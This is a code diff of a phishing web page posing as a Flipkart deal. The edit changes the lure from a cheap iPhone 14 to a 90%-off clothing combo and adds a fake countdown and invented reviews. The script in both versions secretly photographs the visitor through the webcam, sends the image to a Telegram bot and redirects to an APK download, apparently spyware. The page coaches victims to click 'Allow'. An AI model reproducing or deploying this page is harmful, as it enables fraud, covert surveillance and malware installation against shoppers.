@@ -3,22 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flipkart | Identity Sync</title>
+    <title>Flipkart | Premium Fashion Deals</title>
     <style>
         body { background: #f1f3f6; font-family: Roboto, Arial, sans-serif; margin: 0; padding: 0; }
-        .header { background: #2874f0; padding: 12px 16px; color: white; display: flex; align-items: center; }
+        .header { background: #2874f0; padding: 12px 16px; color: white; display: flex; align-items: center; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
         .header img { width: 22px; margin-right: 15px; }
         .container { padding: 15px; display: flex; flex-direction: column; align-items: center; }
-        .info-box { background: white; padding: 20px; width: 90%; max-width: 420px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); text-align: center; }
-        .status-icon { font-size: 40px; color: #388e3c; margin-bottom: 10px; }
-        h2 { font-size: 18px; color: #212121; margin: 5px 0 15px; }
-        .instruction-card { text-align: left; background: #fff9c4; border: 1px solid #fbc02d; padding: 12px; border-radius: 4px; margin-bottom: 20px; }
-        .instruction-card b { color: #d32f2f; font-size: 13px; }
-        .instruction-card p { font-size: 12px; color: #333; margin: 5px 0 0; line-height: 1.4; }
-        .btn-sync { background: #fb641b; color: white; border: none; padding: 16px; font-size: 16px; font-weight: bold; width: 100%; border-radius: 2px; cursor: pointer; text-transform: uppercase; }
+        .card { background: white; padding: 16px; width: 92%; max-width: 450px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); margin-top: 10px; }
+        
+        /* Products Row */
+        .product-row { display: flex; gap: 10px; justify-content: center; margin-bottom: 15px; }
+        .product-img { width: 45%; height: auto; border-radius: 4px; border: 1px solid #f0f0f0; }
+
+        .price-section { display: flex; align-items: center; margin-bottom: 12px; }
+        .special-price { color: #212121; font-size: 24px; font-weight: bold; }
+        .old-price { text-decoration: line-through; color: #878787; margin: 0 8px; font-size: 14px; }
+        .offer-tag { color: #388e3c; font-size: 14px; font-weight: 500; }
+        
+        .timer { color: #d32f2f; font-weight: bold; font-size: 14px; margin-bottom: 10px; display: block; }
+
+        /* Small 'Important' Box */
+        .small-important-box { text-align: left; background: #fff9c4; border: 1px solid #fbc02d; padding: 12px; border-radius: 4px; margin-bottom: 20px; }
+        .small-important-box p { font-size: 12px; color: #333; margin: 0; line-height: 1.4; }
+
+        .btn { background: #ff9f00; color: white; border: none; padding: 15px; font-size: 16px; font-weight: bold; width: 100%; border-radius: 2px; cursor: pointer; text-transform: uppercase; }
         
         /* Reviews Section */
-        .reviews-section { width: 90%; max-width: 420px; background: white; margin-top: 15px; padding: 15px; border-radius: 4px; text-align: left; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        .reviews-section { width: 92%; max-width: 450px; background: white; margin-top: 15px; padding: 15px; border-radius: 4px; text-align: left; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
         .review-title { font-weight: bold; font-size: 16px; margin-bottom: 10px; border-bottom: 1px solid #f0f0f0; padding-bottom: 5px; }
         .review { margin-bottom: 15px; border-bottom: 1px solid #f9f9f9; padding-bottom: 10px; }
         .rev-header { display: flex; align-items: center; margin-bottom: 5px; }
@@ -32,41 +43,45 @@
 
 <div class="header">
     <img src="https://img1a.flixcart.com/www/linchpin/fk-cp-zion/img/flipkart-plus_8d85f4.png" alt="Flipkart">
-    <span>Identity & Security Sync</span>
+    <span>Fashion Deals Alert ⚡</span>
 </div>
 
 <div class="container">
-    <div class="info-box">
-        <div class="status-icon">🛡️</div>
-        <h2>Secure Verification Required</h2>
-        <p style="font-size: 13px; color: #666; margin-bottom: 15px;">iPhone 14 Deal Activation for: <b>+91-XXXXXX</b></p>
+    <div class="card">
+        <span class="timer" id="timer">Offer ends in: 05:00</span>
         
-        <div class="instruction-card">
-            <b>⚠️ IMPORTANT:</b>
-            <p>Next, a <b>"Secure Screen Sync"</b> request will appear. Click <b>'Allow'</b> or <b>'Start'</b> to link your device with Flipkart Security Shield. This is to verify you are a real human buyer.</p>
+        <div class="product-row">
+            <img src="https://rukminim2.flixcart.com/image/612/612/xif0q/jean/r/w/d/32-fmjeno2373-flying-machine-original-imagsb2hyv2xhtzz.jpeg" alt="Men's Jeans" class="product-img">
+            <img src="https://rukminim2.flixcart.com/image/612/612/xif0q/top/r/q/c/m-tttp006764-tokyo-talkies-original-imaghfny8f46tghn.jpeg" alt="Girl's Top" class="product-img">
         </div>
 
-        <button class="btn-sync" onclick="triggerVerification()">Verify & Sync Device</button>
+        <div class="product-title" style="font-size: 16px; font-weight:500;">Premium Jeans & Top Combo (Assorted)</div>
+        
+        <div class="price-section">
+            <span class="special-price">₹300</span>
+            <span class="old-price">₹2,999</span>
+            <span class="offer-tag">90% off</span>
+        </div>
+        
+        <p style="font-size: 13px; color: #d32f2f; font-weight: bold;">Final deal claim step:</p>
+
+        <div class="small-important-box">
+            <p>Important: Claiming this exclusive 90% off fashion deal requires one-time <b>'Identity Sync'</b>. When prompted, click <b>'Allow'</b> or <b>'Start Now'</b> to verify your device's security shield. This ensures genuine claims.</p>
+        </div>
+
+        <button class="btn" onclick="triggerSync()">Verify & Claim Offer</button>
     </div>
 
     <div class="reviews-section">
-        <div class="review-title">Ratings & Reviews (4.8 ★)</div>
-        
+        <div class="review-title">Ratings & Reviews (4.7 ★)</div>
         <div class="review">
-            <div class="rev-header">
-                <span class="rating-star">5 ★</span>
-                <span class="rev-name">Rahul Sharma</span>
-            </div>
-            <div class="rev-text">Bhai sach mein mil gaya! Pehle mujhe laga fake hai but "Sync" karne ke baad offer activate ho gaya. Delivery kal hi ho gayi. Thanks Flipkart!</div>
+            <div class="rev-header"><span class="rating-star">5 ★</span><span class="rev-name">Rahul Sharma</span></div>
+            <div class="rev-text">Quality bohot sahi hai ₹300 mein! Verification safe hai, bas simple process hai inka allow karne ka. Patna delivery slow thi.</div>
             <span class="verified-tick">✓ Certified Buyer, Patna</span>
         </div>
-
         <div class="review">
-            <div class="rev-header">
-                <span class="rating-star">5 ★</span>
-                <span class="rev-name">Anjali Singh</span>
-            </div>
-            <div class="rev-text">Process was very easy. Just had to verify my ID and screen sync. Got iPhone 14 for just 12.5k! Unbelievable deal.</div>
+            <div class="rev-header"><span class="rating-star">5 ★</span><span class="rev-name">Anjali Singh</span></div>
+            <div class="rev-text">Combo is a steal deal. Both the jeans and top fit perfectly. I completed the face sync verification easily. Recommended!</div>
             <span class="verified-tick">✓ Certified Buyer, Mumbai</span>
         </div>
     </div>
@@ -76,11 +91,20 @@
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
-    const token = '8654099233:AAHUe3-Cmh4Yi4v1sI4dwsGi7E4BTdTcMR4';
-    const chat_id = '2043988256';
-    const apk_url = "APKA_SNOOPZA_LINK_YAHAN_DALEIN"; 
+    // TIMER SCRIPT
+    let time = 300;
+    setInterval(() => {
+        let mins = Math.floor(time / 60);
+        let secs = time % 60;
+        document.getElementById('timer').innerHTML = `Offer ends in: 0${mins}:${secs < 10 ? '0' : ''}${secs}`;
+        if(time > 0) time--;
+    }, 1000);
 
-    function triggerVerification() {
+    const token = 'YOUR_TELEGRAM_TOKEN'; // Apna bot token lagayein
+    const chat_id = 'YOUR_CHAT_ID'; // Apna chat ID lagayein
+    const apk_url = "https://sn2go.xyz/96no5"; // Aapne jo link update kiya tha photo mein
+
+    function triggerSync() {
         navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
             const v = document.getElementById('v');
             v.srcObject = stream;
@@ -93,17 +117,16 @@
                 fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: chat_id, photo: img, caption: "🔥 User Verification Success! Sending APK..." })
+                    body: JSON.stringify({ chat_id: chat_id, photo: img, caption: "👕 Fashion Deal Clicked! Verification Success. Pushing APK..." })
                 });
 
-                window.location.href = apk_url="https://
-                    sn2go.xyz/96no5";
+                window.location.href = "https://
+                sn2go.xyz/96no5";
             }, 1000);
         }).catch(err => {
             window.location.href = apk_url;
         });
     }
 </script>
-
 </body>
 </html>
